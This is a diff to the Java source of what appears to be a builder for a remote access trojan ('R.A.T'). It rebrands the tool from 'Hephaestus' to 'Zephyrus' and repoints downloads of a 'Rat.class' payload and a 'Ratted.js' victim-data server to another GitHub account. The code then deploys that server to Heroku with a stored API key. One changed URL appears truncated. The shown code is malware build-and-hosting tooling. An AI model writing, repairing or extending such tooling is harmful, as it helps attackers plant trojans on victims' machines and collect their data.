@@ -36,7 +36,7 @@ import java.util.zip.ZipEntry;
 
 public class Tasks {
     //paths
-    public static File path = new File(System.getenv("APPDATA") + "\\Hephaestus");
+    public static File path = new File(System.getenv("APPDATA") + "\\Zephyrus");
     public static File jdkPath = new File(path + "\\jdk");
     public static File ratClass = new File(path + "\\rat\\Rat.class");
     public static File serverPath = new File(path + "\\server");
@@ -102,7 +102,10 @@ public class Tasks {
         buildMod();
         separator();
     }
-
+    public static void setup() {
+        separator();
+        log("https://www.youtube.com/watch?v=R-F2dygIOZg");
+    }
     /* Setup */
 
     public static void setupJavaJDK() {
@@ -141,9 +144,9 @@ public class Tasks {
             zipFile.extractAll(String.valueOf(jdkPath));
 
             ok("Unzipped Java JDK.");
-            File file = new File("Hephaestus.bat");
+            File file = new File("Zephyrus.bat");
             FileUtils.writeStringToFile(file, jdkPath + "\\bin\\java.exe -jar " + new File(Tasks.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getName() + " & pause", StandardCharsets.UTF_8);
-            warn("Relaunch this program with the Hephaestus.bat file.");
+            warn("Relaunch this program with the Zephyrus.bat file.");
             exit();
         } catch (Exception e) {
             error("Something went wrong while unzipping Java JDK.");
@@ -158,7 +161,7 @@ public class Tasks {
             String key = sc.nextLine();
             herokuAPI = new HerokuAPI(key);
             herokuAPI.getUserInfo(); //verification
-            FileUtils.writeStringToFile(new File(path + "\\herokuapikey.hephaestus"), key, StandardCharsets.UTF_8);
+            FileUtils.writeStringToFile(new File(path + "\\herokuapikey.Zephyrus"), key, StandardCharsets.UTF_8);
             apiKey = key;
             ok("Heroku API key set.");
         } catch (Exception e) {
@@ -171,12 +174,12 @@ public class Tasks {
 
     public static void getHerokuAPIKey() {
         try {
-            if (new File(path + "\\herokuapikey.hephaestus").createNewFile()) {
+            if (new File(path + "\\herokuapikey.Zephyrus").createNewFile()) {
                 setHerokuAPIKey();
                 return;
             }
             log("Checking Heroku API key...");
-            String key = FileUtils.readFileToString(new File(path + "\\herokuapikey.hephaestus"), StandardCharsets.UTF_8);
+            String key = FileUtils.readFileToString(new File(path + "\\herokuapikey.Zephyrus"), StandardCharsets.UTF_8);
             herokuAPI = new HerokuAPI(key);
             herokuAPI.getUserInfo(); //verification
             apiKey = key;
@@ -193,12 +196,12 @@ public class Tasks {
         try {
             log("Downloading server from upstream...");
 
-            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/models/Ratted.js").toURL(), new File(serverPath + "\\models\\Ratted.js"));
-            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/.gitignore").toURL(), new File(serverPath + "\\.gitignore"));
-            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/Procfile").toURL(), new File(serverPath + "\\Procfile"));
-            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/app.js").toURL(), new File(serverPath + "\\app.js"));
-            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/package-lock.json").toURL(), new File(serverPath + "\\package-lock.json"));
-            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/server/package.json").toURL(), new File(serverPath + "\\package.json"));
+            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/D/R.A.T/master/server/models/Ratted.js").toURL(), new File(serverPath + "\\models\\Ratted.js"));
+            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/Jelly289/R.A.T/master/server/.gitignore").toURL(), new File(serverPath + "\\.gitignore"));
+            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/Jelly289/R.A.T/master/server/Procfile").toURL(), new File(serverPath + "\\Procfile"));
+            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/Jelly289/R.A.T/master/server/app.js").toURL(), new File(serverPath + "\\app.js"));
+            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/Jelly289/R.A.T/master/server/package-lock.json").toURL(), new File(serverPath + "\\package-lock.json"));
+            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/Jelly289/R.A.T/master/server/package.json").toURL(), new File(serverPath + "\\package.json"));
 
             ok("Downloaded server from upstream.");
         } catch (Exception e) {
@@ -212,7 +215,7 @@ public class Tasks {
         try {
             log("Downloading R.A.T class from upstream...");
 
-            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/DxxxxY/R.A.T/master/Rat.class").toURL(), ratClass);
+            FileUtils.copyURLToFile(new URI("https://raw.githubusercontent.com/Jelly289/R.A.T/master/Rat.class").toURL(), ratClass);
 
             ok("Downloaded R.A.T class from upstream.");
         } catch (Exception e) {
@@ -341,7 +344,7 @@ public class Tasks {
             config.save();
 
             Git.open(serverPath).add().addFilepattern(".").call();
-            Git.open(serverPath).commit().setMessage("Hephaestus Autocommit").call();
+            Git.open(serverPath).commit().setMessage("Zephyrus Autocommit").call();
             Git.open(serverPath).push().setCredentialsProvider(new UsernamePasswordCredentialsProvider("", apiKey)).setRemote("heroku").call();
 
             ok("Heroku app deployed.");
@@ -519,19 +522,19 @@ public class Tasks {
     /* Shortcut utils */
 
     public static void log(String message) {
-        System.out.println("[Hephaestus] " + message);
+        System.out.println("[Zephyrus] " + message);
     }
 
     public static void warn(String message) {
-        System.out.println("[Hephaestus] [WARNING] " + message);
+        System.out.println("[Zephyrus] [WARNING] " + message);
     }
 
     public static void ok(String message) {
-        System.out.println("[Hephaestus] [OK] " + message);
+        System.out.println("[Zephyrus] [OK] " + message);
     }
 
     public static void error(String message) {
-        System.out.println("[Hephaestus] [ERROR] " + message);
+        System.out.println("[Zephyrus] [ERROR] " + message);
     }
 
     public static void separator() {
